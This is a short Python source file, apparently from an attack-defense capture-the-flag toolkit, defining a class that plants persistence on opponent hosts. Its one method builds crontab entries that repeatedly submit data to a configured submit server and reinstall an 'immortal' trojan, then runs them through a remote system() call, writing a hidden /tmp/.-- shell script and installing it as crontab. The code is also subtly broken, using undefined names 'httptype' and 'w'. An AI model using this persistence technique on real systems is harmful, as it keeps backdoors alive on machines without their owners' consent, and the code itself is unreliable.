import Tools


class WebTrojWorker:
    def __init__(self, config,parent):
        self.cmdtpl=config['env']['cmd_tpl']
        self.submitserver=config['submitserver']
        self.cmdBuilder=Tools.CmdBuilder(self.cmdtpl)
        
    def Attack_CrontabWithImmortalTroj(self,index,cmd):
        rawCrontabStr_autoSubmit=self.cmdBuilder.buildCrontab('*',self.submitserver,httptype)
        rawCrontabStr_troj=self.cmdBuilder.buildCrontab('*',w.team[index].trojContent,'',2)

        crontabStr,md5Str=self.cmdBuilder.buildCmd(f"{rawCrontabStr_autoSubmit}\n{rawCrontabStr_troj}")
        w.runTeamCmd(index,f'system(\'{crontabStr}\')')
        return w.runTeamCmd(index,f'system(\'/usr/bin/crontab /tmp/.--{md5Str}.sh\')')
